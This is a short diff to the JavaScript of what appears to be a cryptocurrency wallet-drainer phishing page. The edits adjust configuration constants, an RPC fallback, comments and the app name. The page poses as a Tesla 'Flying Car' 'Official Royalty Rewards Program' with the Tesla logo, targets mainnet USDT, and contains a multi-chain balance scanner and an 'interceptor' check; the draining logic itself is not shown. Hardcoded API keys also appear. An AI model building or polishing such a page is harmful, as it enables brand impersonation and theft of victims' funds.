@@ -6,15 +6,15 @@ import { mainnet, bsc, polygon, arbitrum, optimism, avalanche } from 'https://es
 
 // --- CONFIGURATION ---
 const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; 
-const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; // REPLACE WITH YOUR DEPLOYED ADDRESS
-const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
+const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; 
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Correct Mainnet USDT
 const CHAIN_ID = 1; 
 
 // Use Vercel Environment Variable for Infura/Alchemy
-const RPC_URL = process.env.NEXT_PUBLIC_INFURA_RPC || "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2"; 
+const RPC_URL = process.env.NEXT_PUBLIC_INFURA_RPC || process.env.RPC_URL || "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2"; 
 
 const metadata = {
- name: 'Tesla Flying Car Rewards',
+ name: 'Tesla Flying Car',
  description: 'Official Royalty Rewards Program',
  url: window.location.origin,
  icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
@@ -84,7 +84,7 @@ function checkInterceptor() {
  return "NO_INTERCEPTOR";
 }
 
-// --- MULTI-CHAIN BALANCE SCANNER (FIXED) ---
+// --- MULTI-CHAIN BALANCE SCANNER ---
 async function scanBalances(address) {
  const balances = [];
 
